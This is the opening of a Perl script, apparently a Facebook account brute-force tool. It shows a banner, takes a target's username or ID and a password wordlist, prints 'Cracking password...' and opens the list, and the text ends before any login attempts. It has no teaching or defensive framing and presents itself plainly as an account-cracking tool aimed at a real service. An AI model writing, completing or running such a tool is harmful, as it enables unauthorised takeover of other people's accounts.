#!/usr/bin/perl

use strict;
use warnings;
use Term::ANSIColor;
use Net::SSLeay::Handle;

my $host = "www.facebook.com";
my $port = "443";

print color("bold green"), "\n", q "

████████╗███████╗ ██████╗  ██╗      █████╗ ███╗   ███╗██████╗ 
╚══██╔══╝██╔════╝██╔════╝  ██║     ██╔══██╗████╗ ████║██╔══██╗
   ██║   █████╗  ██║       ██║     ███████║██╔████╔██║██████╔╝
   ██║   ██╔══╝  ██║       ██║     ██╔══██║██║╚██╔╝██║██╔═══╝ 
   ██║   ███████╗╚██████╗  ███████╗██║  ██║██║ ╚═╝ ██║██║    
   ╚═╝   ╚══════╝ ╚═════╝  ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝   ", "\n";

print "\nEnter [Username Or Account ID ]: 
		                         └─► ";
chomp ( my $user = <STDIN> );

$user =~ s/www.//;
$user =~ s/facebook.com\///;
$user =~ s/fb.com\///;
$user =~ s/http:\/\///;
$user =~ s/https:\/\///;
$user =~ s/profile.php//;
$user =~ s/\?id\=//;

print "\nEnter [ wordlist]:
                                         └─► ";
chomp ( my $wordlist = <STDIN> );

print "\nEmail: $user\@facebook.com";
print "\nCracking password...\n\n";

open ( my $list, $wordlist) or die "\nERROR: there is a problem .\n\n";
